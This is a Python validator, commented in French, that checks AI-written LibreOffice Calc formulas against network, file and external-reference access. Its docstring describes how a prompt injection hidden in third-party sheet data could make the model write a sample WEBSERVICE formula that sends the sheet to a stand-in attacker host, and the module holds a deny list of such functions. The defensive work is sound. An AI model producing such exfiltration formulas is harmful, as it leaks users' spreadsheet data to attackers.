"""Garde des formules Calc écrites par l'IA.

Le contexte envoyé au modèle contient des données de la feuille, parfois issues
d'un classeur tiers. Une injection cachée dans ces données pourrait lui faire
écrire =WEBSERVICE("http://attaquant/?d="&A1), qui exfiltre la feuille au premier
recalcul. Avant tout setFormula, une formule ne peut donc appeler que des
fonctions connues de Calc, sans accès réseau ni fichier.
"""

import re

from .calc_function_names import CALC_FUNCTION_NAMES

# Refusées bien que Calc les connaisse. INDIRECT résout aussi une référence
# externe construite par concaténation, hors de portée des motifs ci-dessous.
NETWORK_OR_FILE_FUNCTIONS = frozenset(
    {"WEBSERVICE", "FILTERXML", "INDIRECT", "HYPERLINK", "DDE"})

# Refusés même dans un texte : références externes ([Classeur.xlsx]Feuille!A1,
# 'fichier'#$Feuille.A1), chemins UNC, qui exposent les identifiants Windows, et URL.
_FORBIDDEN_MARKERS = ("[", "'#", "\\\\", "http://", "https://", "ftp://",
                      "file://", "smb://")

# Littéraux "…" et noms de feuille '…' : « "Total (HT)" » n'appelle aucune fonction.
_QUOTED = re.compile(r"\"(?:[^\"]|\"\")*\"|'(?:[^']|'')*'")
_FUNCTION_CALL = re.compile(r"(?<!\w)([A-Za-z_][A-Za-z0-9_.]*)\s*\(")

def formula_refusal(formula):
    """Raison du refus de *formula*, ou "" si elle peut être écrite."""
    lowered = formula.lower()
    for marker in _FORBIDDEN_MARKERS:
        if marker in lowered:
            return (f"motif {marker!r} interdit : ni réseau, ni fichier, "
                    "ni référence externe")
    code = _QUOTED.sub("", formula)
    called = {name.upper() for name in _FUNCTION_CALL.findall(code)}
    denied = sorted(called & NETWORK_OR_FILE_FUNCTIONS)
    if denied:
        return "fonction(s) réseau ou fichier interdite(s) : " + ", ".join(denied)
    unknown = sorted(called - CALC_FUNCTION_NAMES)
    if unknown:
        return ("fonction(s) inconnue(s) : " + ", ".join(unknown)
                + " ; utilise les noms anglais des fonctions de Calc (SUM, IF…)")
    return ""
